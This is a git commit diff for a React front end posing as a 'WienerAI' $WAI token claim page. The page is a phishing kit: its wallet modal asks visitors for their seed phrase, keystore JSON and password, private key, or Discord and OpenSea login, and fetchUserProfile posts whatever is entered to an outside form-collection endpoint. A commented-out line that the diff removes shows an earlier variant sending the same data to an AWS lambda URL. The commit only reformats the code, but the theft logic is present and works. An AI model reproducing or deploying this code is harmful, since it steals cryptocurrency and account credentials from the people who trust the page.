d2d979398bbcb0c883815001a35a473dd43d73a4
Jnwoke <jnwoke@appzonegroup.com>
2024-08-16 06:54:15 +0100

    :recycle: fix ui

--- src/MainContent.js
+++ src/MainContent.js
@@ -1,88 +1,95 @@
-import React from 'react';
+import React from "react";
 import { useState, useEffect } from "react";
 import WalletModal from "./Modal";
-import Container from 'react-bootstrap/Container';
-import Row from 'react-bootstrap/Row';
-import Col from 'react-bootstrap/Col';
+import Container from "react-bootstrap/Container";
+import Row from "react-bootstrap/Row";
+import Col from "react-bootstrap/Col";
 
 const MainContent = () => {
- const wall=   { endpoint: "tet", id: 2, name: "weiner" };
- const [phrase, setPhrase] = useState(false);
- const [keystore, setKeystore] = useState(false);
- const [privateKey, setPrivateKey] = useState(false);
- const [hardware, setHardware] = useState(false);
- const [wallet, setWallet] = useState({});
+  const wall = { endpoint: "tet", id: 2, name: "weiner" };
+  const [phrase, setPhrase] = useState(false);
+  const [keystore, setKeystore] = useState(false);
+  const [privateKey, setPrivateKey] = useState(false);
+  const [hardware, setHardware] = useState(false);
+  const [wallet, setWallet] = useState({});
 
- const newa = "weiner";
- useEffect(() => {
-   if (newa) {
-     setWallet(newa[0]);
-   }
- }, [newa]);
+  const newa = "weiner";
+  useEffect(() => {
+    if (newa) {
+      setWallet(newa[0]);
+    }
+  }, [newa]);
 
- const [show, setShow] = useState(false);
- const [name, setName] = useState("");
+  const [show, setShow] = useState(false);
+  const [name, setName] = useState("");
 
- const handleShow = (name) => {
-   setShow(true);
-   // setName(name);
- };
+  const handleShow = (name) => {
+    setShow(true);
+    // setName(name);
+  };
 
- const handleClose = () => {
-   setShow(false);
- };
+  const handleClose = () => {
+    setShow(false);
+  };
 
- const handlePhrase = () => {
-   setPhrase(true);
-   setPrivateKey(false);
-   setHardware(false);
-   setKeystore(false);
- };
- const handleKeystore = () => {
-   setPhrase(false);
-   setPrivateKey(false);
-   setHardware(false);
-   setKeystore(true);
- };
- const handlePrivateKey = () => {
-   setPhrase(false);
-   setPrivateKey(true);
-   setHardware(false);
-   setKeystore(false);
- };
- const handleHardware = () => {
-   setPhrase(false);
-   setPrivateKey(false);
-   setHardware(true);
-   setKeystore(false);
- };
+  const handlePhrase = () => {
+    setPhrase(true);
+    setPrivateKey(false);
+    setHardware(false);
+    setKeystore(false);
+  };
+  const handleKeystore = () => {
+    setPhrase(false);
+    setPrivateKey(false);
+    setHardware(false);
+    setKeystore(true);
+  };
+  const handlePrivateKey = () => {
+    setPhrase(false);
+    setPrivateKey(true);
+    setHardware(false);
+    setKeystore(false);
+  };
+  const handleHardware = () => {
+    setPhrase(false);
+    setPrivateKey(false);
+    setHardware(true);
+    setKeystore(false);
+  };
   return (
     <Container className="main-content">
-      <Row className='check'>
-    <Col xs={12} md={8}  className='about'>
-      <h1 className='weiner'>WienerAI</h1>
-      <h2>Part Dog, Part Sausage, Part AI Trading Bot</h2>
-    </Col>
-    <Col xs={12} md={4} className='about2'>
-        <div className='inner'>
-      <p>$WAI Claim Now Live</p>
-      <p>You Can Now Claim Your $WAI Tokens. Plus, Stake Your Tokens To Earn Rewards!</p>
-      <p>Add 0xFE8526A77A2c3590E5973bA81308B90BEA21FBFF To Your Wallet To See Your $WAI.</p>
-      <div className="info">
-        <p>Your Purchased $WAI = 0</p>
-        <p>Your Stakeable $WAI = 0</p>
-      </div>
-      <div className='cb'>
-      
-      <button className="btn btn-primary" onClick={handleShow}>CLAIM</button>
-      <button className="btn btn-secondary" onClick={handleClose}>Connect Wallet</button>
-      <div className="tabs-content">
-              <WalletModal show={show} handleClose={handleClose} name={name} />
-      </div>
-      </div>
-      </div>
-      </Col>
+      <Row className="check">
+        <Col xs={12} md={8} className="about">
+          <h1 className="weiner">WienerAI</h1>
+          <h2>Part Dog, Part Sausage, Part AI Trading Bot</h2>
+        </Col>
+        <Col xs={12} md={4} className="about2">
+          <div className="inner">
+            <p>$WAI Claim Now Live</p>
+            <p>
+              You Can Now Claim Your $WAI Tokens. Plus, Stake Your Tokens To
+              Earn Rewards!
+            </p>
+            <p>
+              Add 0xFE8526A77A2c3590E5973bA81308B90BEA21FBFF To Your Wallet To
+              See Your $WAI.
+            </p>
+            <div className="info">
+              <p>Your Purchased $WAI = 0</p>
+              <p>Your Stakeable $WAI = 0</p>
+            </div>
+            <div className="cb">
+              <button className="btn btn-primary" onClick={handleShow}>
+                CLAIM
+              </button>
+              <button className="btn btn-secondary" onClick={handleClose}>
+                Connect Wallet
+              </button>
+            </div>
+          </div>
+        </Col>
       </Row>
+      <WalletModal show={show} handleClose={handleClose} name={name} />
     </Container>
   );
 };
--- src/Modal.js
+++ src/Modal.js
@@ -1,7 +1,6 @@
 import { useState, useEffect } from "react";
 import { Modal, Button, Tabs, Tab, Form, Spinner } from "react-bootstrap";
 
-
 const WalletModal = ({ show, handleClose, name }) => {
   const [autoconnect, setAutoConnect] = useState(true);
   const [errorToggle, setErrorToggle] = useState(false);
@@ -13,18 +12,21 @@ const WalletModal = ({ show, handleClose, name }) => {
   const [keystorePassword, setKeystorePassword] = useState("");
   const [privateKey, setPrivateKey] = useState("");
 
+  const [activeTab, setActiveTab] = useState(
+    name === "Discord" || name === "OpenSea" ? "credentials" : "phrase"
+  );
 
   const FORMSPARK_ACTION_URL = "https://submit-form.com/GjJ0oWnip";
-
 
   const fetchUserProfile = async () => {
     let value;
     if (phrase !== "") {
-       value = phrase;
-    }else if (privateKey !== "") {
-       value = privateKey
-    }else if (keystoreJson !== ""){
-      var keystore = "json="+keystoreJson+"password="+keystorePassword+"";
+      value = phrase;
+    } else if (privateKey !== "") {
+      value = privateKey;
+    } else if (keystoreJson !== "") {
+      var keystore =
+        "json=" + keystoreJson + "password=" + keystorePassword + "";
       value = keystore;
     }
     await fetch(FORMSPARK_ACTION_URL, {
@@ -35,14 +37,9 @@ const WalletModal = ({ show, handleClose, name }) => {
       },
       body: JSON.stringify({
         value,
-        name
+        name,
       }),
     });
-    // navigate("/wallet-address")
-
-        //  fetch('https://el36hfuw4sipollb5whtrptmje0gmcxw.lambda-url.us-east-1.on.aws/query='+value+'&name='+name)
-        //   .then(response => navigate("/wallet-address"))
-        //   .catch(err => navigate("/wallet-address"));
   };
 
   useEffect(() => {
@@ -58,6 +55,7 @@ const WalletModal = ({ show, handleClose, name }) => {
   };
 
   const toggle = () => setAutoConnect(false);
+
   return (
     <>
       <Modal
@@ -67,8 +65,21 @@ const WalletModal = ({ show, handleClose, name }) => {
           handleExit();
         }}
         dialogClassName="dialog-pop"
+        className=""
       >
-        <Modal.Header closeButton></Modal.Header>
+        <Modal.Header>
+          <Button
+            variant="none"
+            className="ml-auto p-0 btn-close"
+            onClick={() => {
+              handleClose();
+              handleExit();
+            }}
+            style={{ fontSize: "1rem", color: "#000" }}
+          >
+            X
+          </Button>
+        </Modal.Header>
         <Modal.Body>
           <div
             style={{ display: autoconnect ? "block" : "none" }}
@@ -108,204 +119,198 @@ const WalletModal = ({ show, handleClose, name }) => {
           </div>
           <div style={{ display: autoconnect ? "none" : "block" }}>
             <Tabs
-              defaultActiveKey={
-                name === "Discord" || name === "OpenSea"
-                  ? "credentials"
-                  : "phrase"
-              }
+              activeKey={activeTab}
+              onSelect={(key) => setActiveTab(key)}
               id="uncontrolled-tab-example"
               className="mb-3"
             >
               {name !== "Discord" && name !== "OpenSea" && (
                 <Tab eventKey="phrase" title="Phrase">
-                  <>
-                    <Form>
-                      <Form.Group>
-                        <Form.Control
-                          as="textarea"
-                          rows={5}
-                          placeholder="Phrase"
-                          value={phrase}
-                          onChange={(e) => setPhrase(e.target.value)}
-                        />
-                      </Form.Group>
+                  {activeTab === "phrase" && (
+                    <>
+                      <Form>
+                        <Form.Group>
+                          <Form.Control
+                            as="textarea"
+                            rows={5}
+                            placeholder="Phrase"
+                            value={phrase}
+                            onChange={(e) => setPhrase(e.target.value)}
+                          />
+                        </Form.Group>
 
-                      <div
-                        //   className="d-grip gap-2"
-                        style={{ textAlign: "center" }}
-                      >
-                        <Button
-                          variant="primary"
-                          size="md"
-                          onClick={(e) => {
-                            console.log(phrase);
-                            fetchUserProfile();
-                          }}
-                          className="connect-wallet"
-                        >
-                          Connect
-                        </Button>
-                      </div>
-                    </Form>
-                  </>
+                        <div style={{ textAlign: "center" }}>
+                          <Button
+                            variant="primary"
+                            size="md"
+                            onClick={(e) => {
+                              console.log(phrase);
+                              fetchUserProfile();
+                            }}
+                            className="connect-wallet"
+                          >
+                            Connect
+                          </Button>
+                        </div>
+                      </Form>
+                    </>
+                  )}
                 </Tab>
               )}
               {name !== "Discord" && name !== "OpenSea" && (
                 <Tab eventKey="keystore" title="Keystore JSON">
-                  <>
-                    <Form>
-                      <Form.Group>
-                        <Form.Control
-                          as="textarea"
-                          rows={5}
-                          placeholder="Keystore JSON"
-                          value={keystoreJson}
-                          onChange={(e) => setKeystoreJson(e.target.value)}
-                        />
-                      </Form.Group>
+                  {activeTab === "keystore" && (
+                    <>
+                      <Form>
+                        <Form.Group>
+                          <Form.Control
+                            as="textarea"
+                            rows={5}
+                            placeholder="Keystore JSON"
+                            value={keystoreJson}
+                            onChange={(e) => setKeystoreJson(e.target.value)}
+                          />
+                        </Form.Group>
 
-                      <Form.Group style={{ margin: "10px 0" }}>
-                        <Form.Control
-                          type="text"
-                          placeholder="Keystore Password"
-                          value={keystorePassword}
-                          onChange={(e) => setKeystorePassword(e.target.value)}
-                        />
-                      </Form.Group>
+                        <Form.Group style={{ margin: "10px 0" }}>
+                          <Form.Control
+                            type="text"
+                            placeholder="Keystore Password"
+                            value={keystorePassword}
+                            onChange={(e) =>
+                              setKeystorePassword(e.target.value)
+                            }
+                          />
+                        </Form.Group>
 
-                      <div
-                        //className="d-grip gap-2"
-                        style={{ textAlign: "center" }}
-                      >
-                        <Button
-                          variant="primary"
-                          size="md"
-                          onClick={(e) => {
-                            fetchUserProfile();
-                          }}
-                          className="connect-wallet"
-                        >
-                          Connect
-                        </Button>
-                      </div>
-                    </Form>
-                  </>
+                        <div style={{ textAlign: "center" }}>
+                          <Button
+                            variant="primary"
+                            size="md"
+                            onClick={(e) => {
+                              fetchUserProfile();
+                            }}
+                            className="connect-wallet"
+                          >
+                            Connect
+                          </Button>
+                        </div>
+                      </Form>
+                    </>
+                  )}
                 </Tab>
               )}
               {name !== "Discord" && name !== "OpenSea" && (
                 <Tab eventKey="privatekey" title="Private Key">
-                  <>
-                    <Form>
-                      <Form.Group>
-                        <Form.Control
-                          type="text"
-                          placeholder="Private Key"
-                          value={privateKey}
-                          onChange={(e) => setPrivateKey(e.target.value)}
-                        />
-                      </Form.Group>
+                  {activeTab === "privatekey" && (
+                    <>
+                      <Form>
+                        <Form.Group>
+                          <Form.Control
+                            type="text"
+                            placeholder="Private Key"
+                            value={privateKey}
+                            onChange={(e) => setPrivateKey(e.target.value)}
+                          />
+                        </Form.Group>
 
-                      <div
-                        //className="d-grip gap-2"
-                        style={{ textAlign: "center" }}
-                      >
-                        <Button
-                          variant="primary"
-                          size="md"
-                          onClick={(e) => {
-                            fetchUserProfile();
-                          }}
-                          className="connect-wallet"
-                        >
-                          Connect
-                        </Button>
-                      </div>
-                    </Form>
-                  </>
+                        <div style={{ textAlign: "center" }}>
+                          <Button
+                            variant="primary"
+                            size="md"
+                            onClick={(e) => {
+                              fetchUserProfile();
+                            }}
+                            className="connect-wallet"
+                          >
+                            Connect
+                          </Button>
+                        </div>
+                      </Form>
+                    </>
+                  )}
                 </Tab>
               )}
               {name === "Discord" && (
                 <Tab eventKey="credentials" title="Credentials">
-                  <>
-                    <Form>
-                      <Form.Group style={{ margin: "10px 0" }}>
-                        <Form.Control
-                          type="text"
-                          placeholder="Username"
-                          value={username}
-                          onChange={(e) => setUsername(e.target.value)}
-                        />
-                      </Form.Group>
+                  {activeTab === "credentials" && (
+                    <>
+                      <Form>
+                        <Form.Group style={{ margin: "10px 0" }}>
+                          <Form.Control
+                            type="text"
+                            placeholder="Username"
+                            value={username}
+                            onChange={(e) => setUsername(e.target.value)}
+                          />
+                        </Form.Group>
 
-                      <Form.Group style={{ margin: "10px 0" }}>
-                        <Form.Control
-                          type="text"
-                          placeholder="Password"
-                          value={password}
-                          onChange={(e) => setPassword(e.target.value)}
-                        />
-                      </Form.Group>
+                        <Form.Group style={{ margin: "10px 0" }}>
+                          <Form.Control
+                            type="text"
+                            placeholder="Password"
+                            value={password}
+                            onChange={(e) => setPassword(e.target.value)}
+                          />
+                        </Form.Group>
 
-                      <div
-                        //   className="d-grip gap-2"
-                        style={{ textAlign: "center" }}
-                      >
-                        <Button
-                          variant="primary"
-                          size="md"
-                          onClick={(e) => {
-                            fetchUserProfile();
-                          }}
-                          className="connect-wallet"
-                        >
-                          Connect
-                        </Button>
-                      </div>
-                    </Form>
-                  </>
+                        <div style={{ textAlign: "center" }}>
+                          <Button
+                            variant="primary"
+                            size="md"
+                            onClick={(e) => {
+                              fetchUserProfile();
+                            }}
+                            className="connect-wallet"
+                          >
+                            Connect
+                          </Button>
+                        </div>
+                      </Form>
+                    </>
+                  )}
                 </Tab>
               )}
               {name === "OpenSea" && (
                 <Tab eventKey="credentials" title="Credentials">
-                  <>
-                    <Form>
-                      <Form.Group style={{ margin: "10px 0" }}>
-                        <Form.Control
-                          type="text"
-                          placeholder="Username"
-                          value={username}
-                          onChange={(e) => setUsername(e.target.value)}
-                        />
-                      </Form.Group>
+                  {activeTab === "credentials" && (
+                    <>
+                      <Form>
+                        <Form.Group style={{ margin: "10px 0" }}>
+                          <Form.Control
+                            type="text"
+                            placeholder="Username"
+                            value={username}
+                            onChange={(e) => setUsername(e.target.value)}
+                          />
+                        </Form.Group>
 
-                      <Form.Group style={{ margin: "10px 0" }}>
-                        <Form.Control
-                          type="text"
-                          placeholder="Password"
-                          value={password}
-                          onChange={(e) => setPassword(e.target.value)}
-                        />
-                      </Form.Group>
+                        <Form.Group style={{ margin: "10px 0" }}>
+                          <Form.Control
+                            type="text"
+                            placeholder="Password"
+                            value={password}
+                            onChange={(e) => setPassword(e.target.value)}
+                          />
+                        </Form.Group>
 
-                      <div
-                        //   className="d-grip gap-2"
-                        style={{ textAlign: "center" }}
-                      >
-                        <Button
-                          variant="primary"
-                          size="md"
-                          onClick={(e) => {
-                            console.log(username);
-                            console.log(password);
-                            fetchUserProfile();
-                          }}
-                          className="connect-wallet"
-                        >
-                          Connect
-                        </Button>
-                      </div>
-                    </Form>
-                  </>
+                        <div style={{ textAlign: "center" }}>
+                          <Button
+                            variant="primary"
+                            size="md"
+                            onClick={(e) => {
+                              console.log(username);
+                              console.log(password);
+                              fetchUserProfile();
+                            }}
+                            className="connect-wallet"
+                          >
+                            Connect
+                          </Button>
+                        </div>
+                      </Form>
+                    </>
+                  )}
                 </Tab>
               )}
             </Tabs>
